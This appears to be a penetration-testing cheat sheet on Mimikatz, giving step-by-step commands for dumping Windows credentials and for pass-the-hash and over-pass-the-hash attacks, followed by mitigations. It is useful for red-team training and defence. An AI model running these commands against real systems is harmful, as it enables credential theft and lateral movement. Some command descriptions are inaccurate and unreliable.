# Mimikatz

- Mimikatz is a powerful post-exploitation tool used to view and steal credentials, generate Kerberos tickets, and leverage advanced attacks.
- It can dump credentials stored in memory, including plaintext passwords, password hashes, and Kerberos tickets.
- Highly detectable by antivirus solutions, but devastating when AV is disabled, bypassed, or the tool is obfuscated.
- Enables multiple attack vectors: Credential Dumping, Pass-the-Hash, Over-Pass-the-Hash, Silver Ticket, and Golden Ticket attacks.
- Source: https://github.com/gentilkiwi/mimikatz

## Credential Dumping

### Walkthrough

1. Transfer Mimikatz to the Victim Machine

Using any file transfer method (e.g., SMB, HTTP, or direct copy), place `mimikatz.exe` on the target system.

2. Execute Mimikatz with Elevated Privileges

Open an elevated command prompt or PowerShell session and run Mimikatz:

```
mimikatz.exe
```

3. Enable Debug Privileges

Within the Mimikatz prompt, first enable debug privileges to access protected memory:

```
mimikatz # privilege::debug
```

4. Dump Credentials from Memory

Extract all cached credentials and plaintext passwords stored in memory:

```
mimikatz # sekurlsa::logonPasswords
```

This command displays credentials including:

- **Plaintext passwords** (if stored by applications like browsers, Remote Desktop, or credential manager)
- **NTLM hashes** of user accounts
- **Kerberos tickets** (TGT and TGS)
- **Plain passwords** from Credential Manager (Credman)

5. Extract Additional Credential Stores

Dump credentials from Local Security Authority (LSA):

```
mimikatz # lsadump::sam
```

## Pass-the-Hash (PtH)

Once you obtain NTLM hashes, use Mimikatz to inject them into the current session and authenticate as another user without knowing their password:

```
mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash>
```

This creates a new process running with the stolen hash, allowing lateral movement across the domain.

## Over-Pass-the-Hash

Request a new Kerberos TGT using the user's NTLM hash:

```
mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:powershell.exe
```

Within the new PowerShell session, request a TGT:

```powershell
Invoke-Mimikatz -Command '"kerberos::ask /tgt"'
```

This bypasses password requirements while maintaining Kerberos authentication.

## Mitigations

- **Endpoint Detection and Response (EDR)**: Deploy EDR solutions that detect Mimikatz execution and credential access patterns at runtime.
- **Disable Unnecessary Services**: Disable services and features that hold plaintext credentials in memory (e.g., WDigest).
- **Credential Guard**: Enable Windows Defender Credential Guard to isolate and protect credentials in memory on Windows 10/11 and Server 2016+.
- **Restrict Administrator Access**: Limit the number of accounts with administrative privileges and implement Just-In-Time (JIT) admin access.
- **Monitor Memory Access**: Use tools like Sysmon to log suspicious memory access and command execution patterns.
- **Patch Regularly**: Apply security patches promptly to address vulnerabilities that Mimikatz exploits.
- **Multi-Factor Authentication (MFA)**: Enforce MFA to prevent Pass-the-Hash and Over-Pass-the-Hash attacks.
- **Audit Kerberos Ticket Requests**: Monitor for unusual TGT and TGS requests that may indicate forged tickets.
- **Protected Accounts**: Place sensitive accounts (e.g., krbtgt, Domain Admins) in the "Protected Users" security group to restrict delegation and impersonation.
